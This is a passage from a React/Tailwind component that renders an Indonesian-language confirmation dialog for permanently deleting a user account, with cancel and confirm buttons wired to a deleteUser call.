              <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-2xl">
                <AlertTriangle className="w-6 h-6 text-red-400" />
              </div>
              <div>
                <h3 className="text-base font-black">Hapus Akun Pengguna?</h3>
                <p className="text-xs text-white/60">{userToDelete.name} ({userToDelete.role})</p>
              </div>
            </div>

            <p className="text-xs text-white/70 leading-relaxed">
              Apakah Anda yakin ingin menghapus akun pengguna ini secara permanen dari sistem? Seluruh hak akses pengguna akan dicabut seketika.
            </p>

            <div className="flex justify-end gap-2 pt-2">
              <button
                onClick={() => setUserToDelete(null)}
                className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-xl text-xs font-bold cursor-pointer"
              >
                Batal
              </button>
              <button
                onClick={() => {
                  deleteUser(userToDelete.id);
                  setUserToDelete(null);
                }}
                className="px-5 py-2 bg-red-600 hover:bg-red-500 text-white rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-1.5 shadow-lg shadow-red-600/40 cursor-pointer"
              >
                <Trash2 className="w-4 h-4" />
                Ya, Hapus Pengguna
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
